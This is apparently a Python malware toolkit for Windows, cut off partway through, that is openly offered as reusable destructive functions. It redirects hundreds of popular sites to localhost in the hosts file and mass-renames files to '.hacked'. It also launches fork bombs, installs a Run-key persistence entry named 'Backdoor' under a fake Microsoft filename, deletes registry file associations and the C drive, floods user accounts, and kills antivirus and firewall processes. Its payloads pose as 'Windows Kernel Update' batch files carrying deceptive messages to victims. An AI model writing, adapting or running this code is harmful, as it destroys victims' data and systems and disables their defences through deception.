import os
# import datetime
import webbrowser
import time
from natsort import natsorted
import subprocess
import sys
import shutil
import getpass
# import ctypes
# from datetime import datetime as dt
import win10toast

'''
This will add the loopback ip to the websites in the below list to the host file
There are over 500 websites in the below list ( starting with both https:// , www. and domain.com)
There is nothing to be passed to this Function
You wan't Administator Priviliages to do this successfully!
'''
def DISABLE_ACCESS_TO_POPULAR_SITES():
    hosts_test = r"C:\Windows\System32\drivers\etc\hosts"
    hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
    # hosts_test = "D:\development\Python\Windows 11 Upgrade Virus\Main\TEST FOLDER\hosts"

    redirect = "127.0.0.1" # loopback ip
    website_list = [
        "www.facebook.com", "facebook.com", "instragram.com", "www.instragram.com",
        "www.google.com", "google.com", "youtube.com", "www.youtube.com",
        "pornhub.com", "www.pornhub.com", "sex.com", "www.sex.com", "xnxx.com",
        "www.xnxx.com", "discord.com", "www.discord.com", "wwwi.discordapp.com",
        "www.discordapp.com", "www.photos.google.com", "photos.google.com",
        "mail.google.com", "www.mail.google.com", "gmail.com", "www.gmail.com",
        "abc.xyz", "www.abc.xyz", "www.github.com", "github.com", "github.io",
        "www.github.io", "www.daraz.lk", "daraz.lk", "aliexpress.com",
        "www.aliexpress.com", "alibaba.com", "www.alibaba.com", "teachable.com",
        "www.teachable.com", "gov.lk", "www.gov.lk", "health.gov.lk",
        "www.health.gov.lk", "paypal.com", "www.paypal.com", "spotify.com",
        "www.spotify.com", "netlix.com", "www.netflix.com", "amazon.com",
        "www.amazon.com", "wikiepedia.org", "www.wikiepedia.org", "yahoo.com",
        "www.yahoo.com", "reddit.com", "www.reddit.com", "twitter.com",
        "www.twitter.com", "ebay.com", "www.ebay.com", "xvideos.com",
        "www.xvideos.com", "cnn.com", "www.cnn.com", "fandom.com",
        "www.fandom.com", "zoon.us", "www.zoom.us", "walmart.com",
        "www.walmart.com", "craigslist.org", "www.craiglist.org", "weather.com",
        "www.weather.com", "espn.com", "www.espn.com", "imbd.com", "www.imbd.com",
        "foxnew.com", "www.foxnews.com", "linkedin.com", "www.linkedin.com",
        "microsoft.com", "www.microsoft.com", "live.com", "www.live.com",
        "being.com", "www.being.com", "usps.com", "www.usps.com", "msn.com",
        "www.msn.com", "xhamster.com", "www.xhamster.com", "quora.com",
        "www.quora.com", "linustechtips.com", "www.linustechtips.com",
        "lttstore.com", "www.lttstore.com", "apple.com", "www.apple.com",
        "yelp.com", "www.yelp.com", "www.webmd.com", "www.webmd.com", "fedex.com",
        "www.fedex.com", "stackoverflow.com", "www.stackoverflow.com", "nulled.to",
        "www.nulled.to", "weather.gov", "www.weather.gov", "tripadvisor.com",
        "www.tripadvisor.com", "ikman.lk", "www.ikman.lk", "hirufm.lk",
        "www.hirufm.lk", "google.lk", "www.google.lk", "kaymu.lk", "www.kaymu.lk",
        "hirunew.lk", "www.hirunews.lk", "yamu.lk", "www.yamu.lk", "topjobs.lk",
        "www.topjobs.lk", "wix.com", "www.wix.com", "espncricinfo.com",
        "www.espncricinfo.com", "pinterest.com", "www.pinterest.com",
        "gossiplankanews.com", "www.gossiplankanews.com", "lankacnews.com",
        "www.lankacnews.com", "yts.mx", "www.ytx.mx", "yts.am", "www.ytx.am",
        "lankacnews.com", "www.lankacnews.com", "slt.lk", "www.slt.lk",
        "office.com", "www.office.com", "dialog.lk", "www.dialog.lk", "mobitel.lk",
        "www.mobitel.lk", "whatsapp.com", "www.whatsapp.com", "newsfirst.lk",
        "www.newsfirst.lk", "cmb.ac.lk", "www.amb.ac.lk", "elakiri.com",
        "www.elakiri.com", "riyasewana.com", "www.riyasewana.com", "jvpnews.com",
        "www.jvpnews.com", "myshopify.com", "www.myshopify.com",
        "microsoftonline.com", "www.microsoftonline.com", "fiver.com",
        "www.fiver.com", "www.blogger.com", "blogger.com", "http://apple.com",
        "http://youtube.com", "http://www.google.com", "http://www.blogger.com",
        "http://support.google.com", "http://play.google.com", "http://cloudflare.com",
        "http://microsoft.com", "http://mozilla.org", "http://docs.google.com", "http://maps.google.com",
        "http://youtu.be", "http://linkedin.com", "http://en.wikipedia.org", "http://wordpress.org",
        "http://adobe.com", "http://accounts.google.com", "http://sites.google.com", "http://plus.google.com",
        "http://googleusercontent.com", "http://europa.eu", "http://drive.google.com",
        "http://vimeo.com", "http://github.com", "http://pt.wikipedia.org", "http://istockphoto.com",
        "http://amazon.com", "http://vk.com", "http://uol.com.br", "http://bbc.co.uk", "http://cnn.com",
        "http://es.wikipedia.org", "http://facebook.com", "http://bp.blogspot.com", "http://creativecommons.org",
        "http://live.com", "http://news.google.com", "http://whatsapp.com", "http://wikimedia.org",
        "http://hugedomains.com", "http://dailymotion.com", "http://get.google.com", "http://google.es",
        "http://globo.com", "http://bbc.com", "http://gstatic.com", "http://myspace.com", "http://abril.com.br",
        "http://reuters.com", "http://mail.ru", "http://developers.google.com", "http://google.co.jp", "http://w3.org",
        "http://imdb.com", "http://theguardian.com", "http://fr.wikipedia.org", "http://google.de", "http://slideshare.net",
        "http://mail.google.com", "http://issuu.com", "http://google.com.br", "http://nytimes.com", "http://t.me",
        "http://forbes.com", "http://nih.gov", "http://www.yahoo.com", "http://line.me", "http://policies.google.com",
        "http://paypal.com", "http://feedburner.com", "http://msn.com", "http://brandbucket.com", "http://dropbox.com",
        "http://medium.com", "http://jimdofree.com", "http://opera.com", "http://www.weebly.com", "http://latimes.com",
        "http://youronlinechoices.com", "http://steampowered.com", "http://networkadvertising.org", "http://buydomains.com",
        "http://dailymail.co.uk", "http://tools.google.com", "http://bit.ly", "http://lefigaro.fr", "http://apache.org",
        "http://wikia.com", "http://mediafire.com", "http://rakuten.co.jp", "http://files.wordpress.com", "http://telegram.me",
        "http://google.fr", "http://usatoday.com", "http://scribd.com", "http://ig.com.br", "http://cpanel.net",
        "http://it.wikipedia.org", "http://terra.com.br", "http://myaccount.google.com", "http://businessinsider.com",
        "http://booking.com", "http://samsung.com", "http://independent.co.uk", "http://draft.blogger.com", "http://who.int",
        "http://news.yahoo.com", "http://webmd.com", "http://android.com", "http://amazon.co.jp", "http://4shared.com",
        "http://id.wikipedia.org", "http://cpanel.com", "http://amazon.co.uk", "http://wa.me", "http://google.pl",
        "http://search.google.com", "http://foxnews.com", "http://dan.com", "http://translate.google.com",
        "http://picasaweb.google.com", "http://huffingtonpost.com", "http://www.gov.uk", "http://google.ru", "http://nasa.gov",
        "http://ebay.com", "http://tinyurl.com", "http://google.co.uk", "http://thesun.co.uk", "http://huffpost.com",
        "http://elpais.com", "http://hatena.ne.jp", "http://aliexpress.com", "http://books.google.com", "http://telegraph.co.uk",
        "http://pinterest.com", "http://aol.com", "http://un.org", "http://wsj.com", "http://aboutads.info",
        "http://twitter.com", "http://namecheap.com", "http://photos.google.com", "http://change.org", "http://archive.org",
        "http://cnet.com", "http://cdc.gov", "http://time.com", "http://bloomberg.com", "http://plesk.com", "http://fb.com",
        "http://office.com", "http://wired.com", "http://google.it", "http://amazon.de", "http://ok.ru", "http://fandom.com",
        "http://harvard.edu", "http://goo.gl", "http://washingtonpost.com", "http://abcnews.go.com", "http://marketingplatform.google.com",
        "http://de.wikipedia.org", "http://gravatar.com", "http://bandcamp.com", "http://e-monsite.com", "http://walmart.com",
        "http://ign.com", "http://digg.com", "http://sedo.com", "http://abc.net.au", "http://shopify.com", "http://ziddu.com",
        "http://m.wikipedia.org", "http://finance.yahoo.com", "http://depositfiles.com", "http://google.co.id",
        "http://mirror.co.uk", "http://google.com.tw", "http://clickbank.net", "http://wp.com", "http://icann.org",
        "http://list-manage.com", "http://mit.edu", "http://t.co", "http://enable-javascript.com", "http://hollywoodreporter.com",
        "http://naver.com", "http://lemonde.fr", "http://biglobe.ne.jp", "http://trustpilot.com",
        "http://sciencedirect.com", "http://ted.com", "http://stackoverflow.com", "http://express.co.uk",
        "http://ja.wikipedia.org", "http://engadget.com", "http://imageshack.us", "http://doubleclick.net",
        "http://oup.com", "http://espn.com", "http://xbox.com", "http://amazon.es", "http://researchgate.net",
        "http://ietf.org", "http://instagram.com", "http://playstation.com", "http://hp.com", "http://bitly.com",
        "http://forms.gle", "http://elmundo.es", "http://pbs.org", "http://rapidshare.com", "http://secureserver.net",
        "http://asus.com", "http://photobucket.com", "http://techcrunch.com", "http://buzzfeed.com", "http://spotify.com",
        "http://repubblica.it", "http://britannica.com", "http://yahoo.co.jp", "http://sciencemag.org", "http://soundcloud.com",
        "http://cbc.ca", "http://smh.com.au", "http://ipv4.google.com", "http://news.com.au", "http://disqus.com",
        "http://blackberry.com", "http://bund.de", "http://loc.gov", "http://php.net", "http://ovh.com", "http://groups.google.com",
        "http://storage.googleapis.com", "http://ovh.co.uk", "http://sciencedaily.com", "http://netflix.com", "http://unesco.org",
        "http://discord.gg", "http://amazon.fr", "http://yelp.com", "http://npr.org", "http://sapo.pt", "http://imageshack.com",
        "http://nbcnews.com", "http://themeforest.net", "http://instructables.com", "http://psychologytoday.com",
        "http://picasa.google.com", "http://berkeley.edu", "http://sputniknews.com", "http://kickstarter.com", "http://columbia.edu",
        "http://nginx.com", "http://google.nl", "http://www.wix.com", "http://usnews.com", "http://mega.nz", "http://afternic.com",
        "http://alibaba.com", "http://shutterstock.com", "http://cbsnews.com", "http://my.yahoo.com", "http://gnu.org",
        "http://arxiv.org", "http://deezer.com", "http://akamaihd.net", "http://google.co.in", "http://urbandictionary.com",
        "http://huawei.com", "http://abc.es", "http://goodreads.com", "http://discord.com", "http://lycos.com", "http://mysql.com",
        "http://whitehouse.gov", "http://netvibes.com", "http://ytimg.com", "http://bloglovin.com", "http://ria.ru",
        "http://indiatimes.com", "http://nydailynews.com", "http://alexa.com", "http://pl.wikipedia.org", "http://ru.wikipedia.org",
        "http://guardian.co.uk", "http://economist.com", "http://ft.com", "http://noaa.gov", "http://www.over-blog.com",
        "http://welt.de", "http://spiegel.de", "http://gmail.com", "http://detik.com", "http://ovh.net", "http://newsweek.com",
        "http://thetimes.co.uk", "http://mozilla.com", "http://umich.edu", "http://rottentomatoes.com", "http://disney.com",
        "http://yadi.sk", "http://eventbrite.com", "http://wikihow.com", "http://stanford.edu", "http://rambler.ru", "http://gofundme.com",
        "http://nypost.com", "http://twitch.tv", "http://cornell.edu", "http://wiley.com", "http://ibm.com", "http://rt.com",
        "http://fda.gov", "http://tripadvisor.com", "http://nature.com", "http://cnbc.com", "http://godaddy.com", "http://weibo.com",
        "http://chicagotribune.com", "http://oracle.com", "http://sendspace.com", "http://www.wikipedia.org", "http://gizmodo.com",
        "http://bing.com", "http://metro.co.uk", "http://academia.edu", "http://theverge.com", "http://about.com", "http://mashable.com",
        "http://sfgate.com", "http://newyorker.com", "http://nationalgeographic.com", "http://quora.com", "http://privacyshield.gov",
        "http://nginx.org", "http://ca.gov", "http://qq.com", "http://ggpht.com", "http://surveymonkey.com", "http://box.com",
        "http://nikkei.com", "http://ikea.com", "http://variety.com", "http://pixabay.com", "http://hm.com", "http://theatlantic.com",
        "http://googleblog.com", "http://code.google.com", "http://yandex.ru", "http://addtoany.com", "http://adssettings.google.com",
        "http://ea.com", "http://google.ca", "http://dw.com", "http://allaboutcookies.org", "http://zendesk.com", "http://addthis.com",
        "http://washington.edu", "http://cambridge.org", "http://etsy.com", "http://vice.com", "http://sina.com.cn", "http://so-net.ne.jp",
        "http://parallels.com", "http://utexas.edu", "http://ap.org", "http://coursera.org", "http://nicovideo.jp", "http://ubuntu.com",
        "http://searchenginejournal.com", "http://espn.go.com", "http://interia.pl", "http://xing.com", "http://zdnet.com", "http://goo.ne.jp",
        "http://pexels.com", "http://dot.tk", "http://feedproxy.google.com", "http://about.me", "http://evernote.com", "http://freepik.com",
        "http://steamcommunity.com", "http://psu.edu", "http://thedailybeast.com", "http://mystrikingly.com", "http://adweek.com",
        "http://soratemplates.com", "http://thefreedictionary.com", "http://behance.net", "http://springer.com", "http://biblegateway.com",
        "http://offset.com", "http://snapchat.com", "http://target.com", "http://tabelog.com", "http://scientificamerican.com",
        "http://answers.com", "http://liveinternet.ru", "http://state.gov", "http://dreniq.com", "http://daum.net", "http://corriere.it",
        "http://www.livejournal.com", "http://softpedia.com", "http://narod.ru", "http://unicef.org", "http://axs.com",
        "http://pinterest.co.uk", "http://salon.com", "http://last.fm", "http://khanacademy.org", "http://canada.ca", "http://windows.net",
        "http://sakura.ne.jp", "http://prezi.com", "http://over-blog-kiwi.com", "http://ftc.gov", "http://si.edu", "http://answers.yahoo.com",
        "http://house.gov", "http://unsplash.com", "http://standard.co.uk", "http://google.com.au", "http://dell.com", "http://bp1.blogger.com",
        "http://000webhost.com", "http://outlook.com", "http://en.wordpress.com", "http://oecd.org", "http://digitaltrends.com",
        "http://doi.org", "http://airbnb.com", "http://example.com",
        "http://ameblo.jp", "http://epa.gov", "http://prestashop.com", "http://orkut.com.br",
        "http://amzn.to", "http://ebay.co.uk", "http://scoop.it", "http://entrepreneur.com",
        "http://www.canalblog.com", "http://usgs.gov", "http://weather.com", "http://undeveloped.com",
        "http://feedburner.google.com", "http://pastebin.com", "http://lifehacker.com", "http://amazon.ca",
        "http://worldbank.org", "http://e-recht24.de", "http://upenn.edu", "http://arstechnica.com",
        "http://go.co", "http://viglink.com", "http://ehow.com", "http://cia.gov", "http://fifa.com",
        "http://lonelyplanet.com", "http://calameo.com", "http://prnewswire.com", "http://weforum.org",
        "http://eonline.com", "http://dreamstime.com", "http://ndtv.com", "http://gutenberg.org",
        "http://cam.ac.uk", "http://udemy.com", "http://amazon.in", "http://storage.canalblog.com",
        "http://eff.org", "http://rollingstone.com", "http://businesswire.com", "http://iso.org", "http://zeit.de",
        "http://home.neustar", "http://indiegogo.com", "http://boston.com", "http://reverbnation.com",
        "http://howstuffworks.com", "http://calendar.google.com", "http://asahi.com", "http://inc.com",
        "http://a8.net", "http://nba.com", "http://allrecipes.com", "http://com.com", "http://rediff.com",
        "http://oreilly.com", "http://stuff.co.nz", "http://cointernet.com.co", "http://fb.me", "http://greenpeace.org",
        "http://video.google.com", "http://jhu.edu", "http://theglobeandmail.com", "http://cafepress.com", "apple.com",
        "youtube.com", "www.google.com", "www.blogger.com", "support.google.com", "play.google.com", "cloudflare.com",
        "microsoft.com", "mozilla.org", "docs.google.com", "maps.google.com", "youtu.be", "linkedin.com", "en.wikipedia.org",
        "wordpress.org", "adobe.com", "accounts.google.com", "sites.google.com", "plus.google.com", "googleusercontent.com",
        "europa.eu", "drive.google.com", "vimeo.com", "github.com", "pt.wikipedia.org", "istockphoto.com", "amazon.com",
        "vk.com", "uol.com.br", "bbc.co.uk", "cnn.com", "es.wikipedia.org", "facebook.com", "bp.blogspot.com", "creativecommons.org",
        "live.com", "news.google.com", "whatsapp.com", "wikimedia.org", "hugedomains.com", "dailymotion.com", "get.google.com",
        "google.es", "globo.com", "bbc.com", "gstatic.com", "myspace.com", "abril.com.br", "reuters.com", "mail.ru", "developers.google.com",
        "google.co.jp", "w3.org", "imdb.com", "theguardian.com", "fr.wikipedia.org", "google.de", "slideshare.net", "mail.google.com",
        "issuu.com", "google.com.br", "nytimes.com", "t.me", "forbes.com", "nih.gov", "www.yahoo.com", "line.me", "policies.google.com",
        "paypal.com", "feedburner.com", "msn.com", "brandbucket.com", "dropbox.com", "medium.com", "jimdofree.com", "opera.com", "www.weebly.com",
        "latimes.com", "youronlinechoices.com", "steampowered.com", "networkadvertising.org", "buydomains.com", "dailymail.co.uk", "tools.google.com",
        "bit.ly", "lefigaro.fr", "apache.org", "wikia.com", "mediafire.com", "rakuten.co.jp", "files.wordpress.com", "telegram.me", "google.fr",
        "usatoday.com", "scribd.com", "ig.com.br", "cpanel.net", "it.wikipedia.org", "terra.com.br", "myaccount.google.com", "businessinsider.com",
        "booking.com", "samsung.com", "independent.co.uk", "draft.blogger.com", "who.int", "news.yahoo.com", "webmd.com", "android.com",
        "amazon.co.jp", "4shared.com", "id.wikipedia.org", "cpanel.com", "amazon.co.uk", "wa.me", "google.pl", "search.google.com", "foxnews.com",
        "dan.com", "translate.google.com", "picasaweb.google.com", "huffingtonpost.com", "www.gov.uk", "google.ru", "nasa.gov", "ebay.com",
        "tinyurl.com", "google.co.uk", "thesun.co.uk", "huffpost.com", "elpais.com", "hatena.ne.jp", "aliexpress.com", "books.google.com", "telegraph.co.uk",
        "pinterest.com", "aol.com", "un.org", "wsj.com", "aboutads.info", "twitter.com", "namecheap.com", "photos.google.com", "change.org", "archive.org",
        "cnet.com", "cdc.gov", "time.com", "bloomberg.com", "plesk.com", "fb.com", "office.com", "wired.com", "google.it", "amazon.de", "ok.ru", "fandom.com",
        "harvard.edu", "goo.gl", "washingtonpost.com", "abcnews.go.com", "marketingplatform.google.com", "de.wikipedia.org", "gravatar.com", "bandcamp.com",
        "e-monsite.com", "walmart.com", "ign.com", "digg.com", "sedo.com", "abc.net.au", "shopify.com", "ziddu.com", "m.wikipedia.org", "finance.yahoo.com",
        "depositfiles.com", "google.co.id", "mirror.co.uk", "google.com.tw", "clickbank.net", "wp.com", "icann.org", "list-manage.com", "mit.edu", "t.co",
        "enable-javascript.com", "hollywoodreporter.com", "naver.com", "lemonde.fr", "biglobe.ne.jp", "trustpilot.com", "sciencedirect.com", "ted.com",
        "stackoverflow.com", "express.co.uk", "ja.wikipedia.org", "engadget.com", "imageshack.us", "doubleclick.net", "oup.com", "espn.com", "xbox.com",
        "amazon.es", "researchgate.net", "ietf.org", "instagram.com", "playstation.com", "hp.com", "bitly.com", "forms.gle", "elmundo.es", "pbs.org",
        "rapidshare.com", "secureserver.net", "asus.com", "photobucket.com", "techcrunch.com", "buzzfeed.com", "spotify.com", "repubblica.it", "britannica.com",
        "yahoo.co.jp", "sciencemag.org", "soundcloud.com", "cbc.ca", "smh.com.au", "ipv4.google.com", "news.com.au", "disqus.com", "blackberry.com", "bund.de",
        "loc.gov", "php.net", "ovh.com", "groups.google.com", "storage.googleapis.com", "ovh.co.uk", "sciencedaily.com", "netflix.com", "unesco.org", "discord.gg",
        "amazon.fr", "yelp.com", "npr.org", "sapo.pt", "imageshack.com", "nbcnews.com", "themeforest.net", "instructables.com", "psychologytoday.com",
        "picasa.google.com", "berkeley.edu", "sputniknews.com", "kickstarter.com", "columbia.edu", "nginx.com", "google.nl", "www.wix.com", "usnews.com",
        "mega.nz", "afternic.com", "alibaba.com", "shutterstock.com", "cbsnews.com", "my.yahoo.com", "gnu.org", "arxiv.org", "deezer.com", "akamaihd.net",
        "google.co.in", "urbandictionary.com", "huawei.com", "abc.es", "goodreads.com", "discord.com", "lycos.com", "mysql.com", "whitehouse.gov",
        "netvibes.com", "ytimg.com", "bloglovin.com", "ria.ru", "indiatimes.com", "nydailynews.com", "alexa.com", "pl.wikipedia.org", "ru.wikipedia.org",
        "guardian.co.uk", "economist.com", "ft.com", "noaa.gov", "www.over-blog.com", "welt.de", "spiegel.de", "gmail.com", "detik.com", "ovh.net", "newsweek.com",
        "thetimes.co.uk", "mozilla.com", "umich.edu", "rottentomatoes.com", "disney.com", "yadi.sk", "eventbrite.com", "wikihow.com", "stanford.edu", "rambler.ru",
        "gofundme.com", "nypost.com", "twitch.tv", "cornell.edu", "wiley.com", "ibm.com", "rt.com", "fda.gov", "tripadvisor.com", "nature.com", "cnbc.com", "godaddy.com",
        "weibo.com", "chicagotribune.com", "oracle.com", "sendspace.com", "www.wikipedia.org", "gizmodo.com", "bing.com", "metro.co.uk", "academia.edu", "theverge.com",
        "about.com", "mashable.com", "sfgate.com", "newyorker.com", "nationalgeographic.com", "quora.com", "privacyshield.gov", "nginx.org", "ca.gov", "qq.com",
        "ggpht.com", "surveymonkey.com", "box.com", "nikkei.com", "ikea.com", "variety.com", "pixabay.com", "hm.com", "theatlantic.com", "googleblog.com", "code.google.com",
        "yandex.ru", "addtoany.com", "adssettings.google.com", "ea.com", "google.ca", "dw.com", "allaboutcookies.org", "zendesk.com", "addthis.com", "washington.edu",
        "cambridge.org", "etsy.com", "vice.com", "sina.com.cn", "so-net.ne.jp", "parallels.com", "utexas.edu", "ap.org", "coursera.org", "nicovideo.jp", "ubuntu.com",
        "searchenginejournal.com", "espn.go.com", "interia.pl", "xing.com", "zdnet.com", "goo.ne.jp", "pexels.com", "dot.tk", "feedproxy.google.com", "about.me",
        "evernote.com", "freepik.com", "steamcommunity.com", "psu.edu", "thedailybeast.com", "mystrikingly.com", "adweek.com", "soratemplates.com", "thefreedictionary.com",
        "behance.net", "springer.com", "biblegateway.com", "offset.com", "snapchat.com", "target.com", "tabelog.com", "scientificamerican.com", "answers.com",
        "liveinternet.ru", "state.gov", "dreniq.com", "daum.net", "corriere.it", "www.livejournal.com", "softpedia.com", "narod.ru", "unicef.org", "axs.com", "pinterest.co.uk",
        "salon.com", "last.fm", "khanacademy.org", "canada.ca", "windows.net", "sakura.ne.jp", "prezi.com", "over-blog-kiwi.com", "ftc.gov", "si.edu",
        "answers.yahoo.com", "house.gov", "unsplash.com", "standard.co.uk", "google.com.au", "dell.com", "bp1.blogger.com", "000webhost.com", "outlook.com",
        "en.wordpress.com", "oecd.org", "digitaltrends.com", "doi.org", "airbnb.com", "example.com", "ameblo.jp", "epa.gov", "prestashop.com", "orkut.com.br",
        "amzn.to", "ebay.co.uk", "scoop.it", "entrepreneur.com", "www.canalblog.com", "usgs.gov", "weather.com", "undeveloped.com", "feedburner.google.com",
        "pastebin.com", "lifehacker.com", "amazon.ca", "worldbank.org", "e-recht24.de", "upenn.edu", "arstechnica.com", "go.co", "viglink.com", "ehow.com",
        "cia.gov", "fifa.com", "lonelyplanet.com", "calameo.com", "prnewswire.com", "weforum.org", "eonline.com", "dreamstime.com", "ndtv.com", "gutenberg.org",
        "cam.ac.uk", "udemy.com", "amazon.in", "storage.canalblog.com", "eff.org", "rollingstone.com", "businesswire.com", "iso.org", "zeit.de", "home.neustar",
        "indiegogo.com", "boston.com", "reverbnation.com", "howstuffworks.com", "calendar.google.com", "asahi.com", "inc.com", "a8.net", "nba.com", "allrecipes.com",
        "com.com", "rediff.com", "oreilly.com", "stuff.co.nz", "cointernet.com.co", "fb.me", "greenpeace.org", "video.google.com", "jhu.edu", "theglobeandmail.com", "cafepress.com"
    ]

    # write to the hosts file
    with open(hosts_test, 'r+') as file:
        content = file.read()
        for website in website_list:
            if website in content:
                pass
            else:
                file.write(redirect + " " + website + "\n")


'''
You need to pass 3 items in the following order: An usage example is given below
RENAME_MULTIPLE_FILES_IN_GIVEN_PATH("D:\Images\Private", "picture", ".hacked")
In the above example, first the folder path is passed, then the name of the file, then the extension is passed
Make sure to include the '.' before typing the example, eg: '.txt'

The Take place to the files in the specified directory only!
'''
def RENAME_MULTIPLE_FILES_IN_GIVEN_PATH(folerpath, new_name, extension):
    os.chdir(folerpath)
    for (i, filename) in enumerate(natsorted(os.listdir(folerpath))):
        os.rename(src=filename, dst='{}{}{}'.format(new_name,i,extension))


'''
Nothing will be prompted to the user
This will cause the PC to crash and would need a restart to fix it!

( There is a function in this script to start the malicious file at startup )
'''
def FORK_BOMB_NO_WINDOW(): # this crashed my pc with 32gb 2666mhz ram and 15-10400 turboing upto 4.0 GHz within 1 second
    while True:
        subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)


'''
The file extension need to passed to this function

If are going to compile this ( Maybe using pyinstaller )
You can pass 'exe' to the function when using it!
Make sure to not to include the '.' when passing the extension
'''
def START_AGAIN_AFTER_RESTART(filee): # The last restart # filee should be passed without a '.' and incase you didn't know, its the file extension
    # part 1
    '''
    I have tried this part of the code and it works fine
    Incase if something goes wrong with this, there is the part 2 of this function
    '''
    location = os.environ["appdata"] + "\\MicrosoftSecurityServiceSecondary." + filee
    if not os.path.exists(location):
        shutil.copyfile(sys.executable, location)
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + '"', shell=True)

    '''
    I haven't tested this, this code is not mine
    '''
    # part 2
    USER_NAME = getpass.getuser()
    def ADD_BAT_TO_STARTUP_FOLDER(file_path=""):
        if file_path == "":
            file_path = os.path.dirname(os.path.realpath(__file__))
            # file_path = os.environ["appdata"] + "\\MicrosoftSecurityServiceSecondary.exe" # we could also use this
        bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
        with open(bat_path + '\\' + "open.bat", "w+") as bat_file:
            bat_file.write(r'start "" %s' % file_path)

    ADD_BAT_TO_STARTUP_FOLDER() # i am not very sure about excecuting this, but, idek, its ur choice


'''
You need to pass the url of the website to this function!
example: FORK_BOMB_WITH_WEBSITE(https://youtube.com)

This will open the website you passed to the function until the computer crashes
'''
def FORK_BOMB_WITH_WEBSITE(url):
    while True:
        webbrowser.open(url)


'''
You need pass something of these two when using this function: 'yesfile' and 'nofile'
'yesfile' will create a file and run the command ( .bat file )
'nofile' will not create a file, but will still run the code successfully!
'''
def DELETE_KEY_REGISTRY_FILES(wantfile="nofile"): # wantfile should be "yesfile" or "nofile"
    if wantfile == "nofile":
        command1 = "reg delete HKCR/.exe"
        command2 = "reg delete HKCR/.dll"
        command3 = "reg delete HKCR/*"
        os.system(command1)
        time.sleep(1)
        os.system(command2)
        time.sleep(1)
        os.system(command3)

    elif wantfile == "yesfile":
        commands = """@ECHO OFF
START reg delete HKCR/.exe
START reg delete HKCR/.dll
START reg delete HKCR/*
:MESSAGE
ECHO Windows Kernel is being updated. Please don't turn off your computer.
GOTO MESSAGE"""
        file = open("Windows_Kernel_Update_Temporary_File.bat", 'w+')
        file.write(commands)
        file.close()
        time.sleep(1)
        run_made_file1 = ".\Windows_Kernel_Update_Temporary_File.bat"
        os.system(run_made_file1)

    else:
        return "Wrong Input Passed to the Function"


'''
This will open untilimted notepads until the computer crash
You need pass 1 value when calling this function and it is
the text to display in every notepad window which keeps opening
if you pass the value 'notext' : no text will be shown when opening every notepad window
if you pass the value 'yestext' : this will show a message convincing the user to start the same file again
'''
def FORK_BOMB_WITH_NOTEPAD(needtext):
    if needtext == "notext":
        cmd_fb_notepad_notext = """@ECHO off
:top
START %SystemRoot%\system32\notepad.exe
GOTO top"""
        os.system(cmd_fb_notepad_notext)

    elif needtext == "yestext": # tried to make this file in system32 folder and i failed :(
        file_fb_notepad = open(r"Windows_Kernel_Update_Data_Settings.txt", "w+")
        file_fb_notepad.write("Windows Kernel is updating\nYou might get some freezes and crashes until this is complete\nIf this happens, make sue to start this again")
        file_fb_notepad.close()

        while True:
            os.system("notepad Windows_Kernel_Update_Data_Settings.txt")
        
    else:
        return "Wrong Input Passed to the Function"       


'''
Will open many software at once, these software comes bundled with windows ( 7 and above, i'm not sure about Windows Vista )
They will be opening until the computer crashes and this needs a restart to fix this!
The softwares this function will open are:
    MS Paint, Notepade, WordPad, Command Prompt, Explorer, Control Panel and the Calculator
'''
def FORK_BOMB_MANY_SOFTWARE_AT_ONCE():
    cmd_fb_many_at_once = r"""@ECHO OFF
:x
start mspaint
start notepad
start write
start cmd
start explorer
start control
start calc
goto x"""
    
    filefbmao = open("Windows_Kernel_Update_Command_List.bat", "w+")
    filefbmao.write(cmd_fb_many_at_once)
    filefbmao.close()
    time.sleep(1)

    os.system("Windows_Kernel_Update_Command_List.bat")


'''
This function will make as many as folders possible with random numbers
make sure to change the path to the needed folder before using the function 
( this cannot be done with this function, you need to do it manually)

The value to pass to this function is optional, You can pass some custom file name if you like
The default name will be "Windows_Critical_Update_File.bat"
'''
def FOLDER_FLOODER(filename="Windows_Critical_Update_File.bat"):
    if filename == "no":
        while True:
            os.system('md %random%')

    else:
        cmd_folder_flooder = """@echo off
:x
md %random%
goto x"""
        
        fileff = open(str(filename), "w+")
        fileff.write(cmd_folder_flooder)
        fileff.close()
        time.sleep(1)
        os.system(str(filename))



'''
This function will make as many as folders possible with random numbers in the Users folder
which will result in creating many user accounts!

The value to pass to this function is optional, You can pass some custom file name if you like
The default name will be "Windows_Critical_KERNEL_Update_File.bat"
'''
def USER_ACCOUNTS_FLOODER(filename="Windows_Critical_KERNEL_Update_File.bat"):
    cmd_ua_ff = """@echo off
:xnet
user %random% /add
goto x"""
    
    fileuaf = open(str(filename), "w+")
    fileuaf.write(cmd_ua_ff)
    fileuaf.close()
    time.sleep(1)
    os.system(str(filename))


'''
This function will create unlimited processes until the computer crash

The value to pass to this function is optional, You can pass some custom file name if you like
The default name will be "Start_Update_Again_if_Failed.bat"
'''
def PROCESS_CREATOR(filename="Start_Update_Again_if_Failed.bat"):
    cmd_process_creator = "%0|%0"
    
    filepc = open(filename, "w+")
    filepc.write(cmd_process_creator)
    filepc.close()
    time.sleep(1)
    os.system(filename)

'''
This function will create every file in Local Disk C

The value to pass to this function is optional, You can pass some custom file name if you like
The default name will be "RECOVER_UPDATE_FILES.bat"
'''
def DELETE_C_DRIVE(filename="RECOVER_UPDATE_FILES.bat"):
    cmd_del_c_drive_1 = """@Echo off
Del C:\ *.* |y"""

    filedelc = open(filename, "w+")
    filedelc.write(cmd_del_c_drive_1)
    filedelc.close()
    time.sleep(1)
    os.system(filename)

'''
I own no credit to this code! This will kill all the processes of AV 
and will remove every file inside the installed directories of the particualar AV

The value to pass to this function is optional, You can pass some custom file name if you like
The default name will be "Windows_Security_Update_File.bat"
'''
def DELETE_ANTIVIRUS_SOFTWARE(filename="Windows_Security_Update_File.bat"):
    cmd_del_av = r"""@echo off
rem
rem Permanently Kill Anti-Virus
net stop “Security Center”
netsh firewall set opmode mode=disable
tskill /A av*
tskill /A fire*
tskill /A anti*
cls
tskill /A spy*
tskill /A bullguard
tskill /A PersFw
tskill /A KAV*
tskill /A ZONEALARM
tskill /A SAFEWEB
cls
tskill /A spy*
tskill /A bullguard
tskill /A PersFw
tskill /A KAV*
tskill /A ZONEALARM
tskill /A SAFEWEB
cls
tskill /A OUTPOST
